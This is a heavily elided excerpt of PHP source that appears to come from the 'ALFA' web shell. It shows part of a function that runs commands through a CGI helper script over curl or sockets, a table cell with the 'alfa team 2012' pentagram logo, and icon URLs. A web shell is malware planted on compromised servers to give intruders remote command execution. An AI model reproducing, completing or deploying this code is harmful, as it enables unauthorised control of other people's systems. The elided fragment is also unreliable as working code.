...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if($is_curl||$is_socket){
		...
		$cgi_url = __TrYsIdeWEd_FOLDER__."/alfacgiapi/".$lang.$cgi_ext;
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="180" height="170" alt="alfa team 2012" draggable="false" src="https://www.freepnglogos.com/uploads/pentagram-png/clipart-red-pentagram-20.png" /></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='https://png.pngtree.com/png-clipart/20190307/ourmid/pngtree-pentagram-png-image_779593.jpg';
	$s['alfamini']='https://www.freepnglogos.com/uploads/pentagram-png/clipart-red-pentagram-20.png';
	$s['loader']='https://www.freepnglogos.com/uploads/pentagram-png/clipart-red-pentagram-20.png';
